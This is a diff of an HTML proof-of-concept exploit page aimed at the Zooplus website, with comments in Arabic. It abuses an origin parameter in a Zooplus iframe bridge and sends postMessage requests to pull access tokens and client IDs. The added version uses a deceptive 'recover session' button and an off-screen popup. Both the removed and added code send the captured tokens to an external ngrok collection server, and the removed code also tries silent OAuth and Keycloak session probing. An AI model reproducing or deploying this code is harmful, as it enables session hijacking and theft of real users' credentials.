@@ -1,82 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Zooplus Token Leak PoC</title>
-    <style>
-        body { background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .log-entry { border-bottom: 1px solid #333; padding: 5px; margin-bottom: 5px; }
-        .token-highlight { color: #ff00ff; font-weight: bold; word-break: break-all; }
-        iframe { display: none; }
-    </style>
+    <title>PoC: Zooplus Identity Theft</title>
 </head>
-<body>
-    <h2>[!] Zooplus Identity Hijacking Terminal</h2>
-    <div id="status">Initializing Attack Vectors...</div>
-    <div id="console"></div>
-
-    <iframe id="bridge_iframe" src="https://stm.zooplus.com/sw_iframe.html?origin=https://egyhaker.github.io/webmd.com-attacker/test2.html"></iframe>
-    
-    <iframe id="auth_iframe" src="https://login.zooplus.com/auth/realms/zooplus/protocol/openid-connect/login-status-iframe.html"></iframe>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+    <h2>[!] Exploit Status: <span id="status">Waiting for User Interaction...</span></h2>
+    <button id="startAttack" style="padding:15px; background:red; color:white; font-weight:bold; cursor:pointer;">
+        CLICK TO RECOVER SESSION
+    </button>
+    <div id="logs" style="margin-top:20px; border:1px dashed #0f0; padding:10px;"></div>
 
     <script>
-        const logBox = document.getElementById('console');
-        const statusBox = document.getElementById('status');
-
-        function log(msg, isCritical = false) {
-            const div = document.createElement('div');
-            div.className = 'log-entry';
-            div.innerHTML = `<span style="color: ${isCritical ? 'red' : '#00ff00'}">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
-            logBox.prepend(div);
+        const logs = document.getElementById('logs');
+        const status = document.getElementById('status');
+        
+        function log(msg) {
+            logs.innerHTML += `> ${msg}<br>`;
+            console.log(msg);
         }
 
-        window.addEventListener("message", function(event) {
-            // رصد أي رسائل قادمة من نطاقات zooplus
-            if (event.origin.includes("zooplus.com")) {
-                log(`RECEIVED from ${event.origin}: ` + JSON.stringify(event.data));
+        document.getElementById('startAttack').onclick = function() {
+            log("Opening Targeted Popup...");
+            // نفتح صفحة الجسر التي بها ثغرة الـ Origin Parameter
+            // نمرر رابط صفحتنا كـ "Origin" موثوق
+            const targetUrl = "https://stm.zooplus.com/sw_iframe.html?origin=" + encodeURIComponent(window.location.origin);
+            const popup = window.open(targetUrl, "zooplus_bridge", "width=1,height=1,left=-1000,top=-1000");
 
-                // إذا كانت الرسالة تحتوي على التوكن أو معلومات الجلسة
-                if (event.data.token || event.data.access_token) {
-                    log(`🎯 SUCCESS! Access Token Leaked: <span class="token-highlight">${event.data.token || event.data.access_token}</span>`, true);
-                    statusBox.innerText = "TOKEN CAPTURED!";
+            status.innerText = "Attack in Progress...";
+
+            // التنصت على الرد القادم من الجسر
+            window.addEventListener("message", function(event) {
+                // التأكد أن الرسالة قادمة من نطاق Zooplus
+                if (event.origin.includes("zooplus.com")) {
+                    log("🔓 DATA EXFILTRATED: " + JSON.stringify(event.data));
                     
-                    // تهريب التوكن فوراً لسيرفر المهاجم
-                    fetch(`https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/collect?token=${event.data.token}`);
+                    if (event.data.clientId || event.data.token) {
+                        status.innerText = "SUCCESS: DATA STOLEN!";
+                        status.style.color = "red";
+                        
+                        // محاكاة إرسال البيانات لسيرفر المهاجم
+                        log("Sending captured credentials to attacker C2 server...");
+                        navigator.sendBeacon("https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/collect", JSON.stringify(event.data));
+                    }
                 }
+            }, false);
 
-                // إذا حصلنا على الـ ClientID، نبدأ المرحلة الثانية
-                if (event.data.clientId) {
-                    log(`Found ClientID: ${event.data.clientId}. Attempting Session Hijacking...`);
-                    triggerKeycloakProbe(event.data.clientId);
-                }
-            }
-        });
-
-        function triggerKeycloakProbe(clientId) {
-            const authWin = document.getElementById('auth_iframe').contentWindow;
-            // محاولة إجبار Keycloak على كشف الحالة
-            authWin.postMessage(clientId + " check-session", "https://login.zooplus.com");
-        }
-
-        // محاولة سحب التوكن عبر الجسر بعد التحميل
-        document.getElementById('bridge_iframe').onload = function() {
-            log("Bridge loaded. Injecting Request for frontendAuthorizer...");
-            const bridgeWin = document.getElementById('bridge_iframe').contentWindow;
-            
-            // نرسل طلباً للجسر يحاكي طلبات الموقع الداخلي لسحب التوكن
-            bridgeWin.postMessage({
-                type: "GET_AUTHORIZATION",
-                property: "frontendAuthorizer.token" 
-            }, "*");
+            // إرسال أمر للجسر لإجبار الـ EventBus على بث التوكن
+            setTimeout(() => {
+                log("Injecting Command to Bridge...");
+                popup.postMessage({ type: "GET_SESSION_INFO" }, "*");
+                
+                // محاولة أخرى لاصطياد الـ Auth Success Event
+                popup.postMessage({ type: "AUTH-SUCCESS-EVENT-v1" }, "*");
+            }, 3000);
         };
-
-        // محاكاة عملية Silent Refresh لسحب توكن جديد
-        setTimeout(() => {
-            log("Attempting Silent Authentication Flow via hidden frame...");
-            const silentFrame = document.createElement('iframe');
-            silentFrame.src = "https://login.zooplus.com/auth/realms/zooplus/protocol/openid-connect/auth?client_id=shop-myzooplus-prod-zooplus&response_type=token&scope=openid&prompt=none&redirect_uri=https://stm.zooplus.com/sw_iframe.html";
-            document.body.appendChild(silentFrame);
-        }, 5000);
-
     </script>
 </body>
 </html>
